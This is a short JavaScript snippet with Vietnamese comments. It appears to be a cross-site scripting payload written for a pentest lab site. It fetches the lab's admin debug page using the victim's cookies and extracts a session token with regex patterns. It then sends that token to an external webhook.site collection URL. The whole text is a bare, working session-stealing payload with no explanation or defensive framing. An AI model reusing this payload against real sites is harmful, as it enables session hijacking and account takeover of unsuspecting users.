fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {credentials:'include'})
.then(r => r.text())
.then(html => {
    // Tìm lab1_session - thử các pattern phổ biến
    let sessionMatch = html.match(/lab1_session[=:]\s*([^"'\s<]+)/i);
    if (!sessionMatch) sessionMatch = html.match(/[a-f0-9]{32}/i);
    
    // Nếu tìm thấy session
    if (sessionMatch) {
        const sessionValue = sessionMatch[1] || sessionMatch[0];
        
        // Gửi POST request với session value
        fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session: sessionValue
                // CHỈ GỬI ĐÚNG session, không gửi gì thêm
            })
        });
    }
})
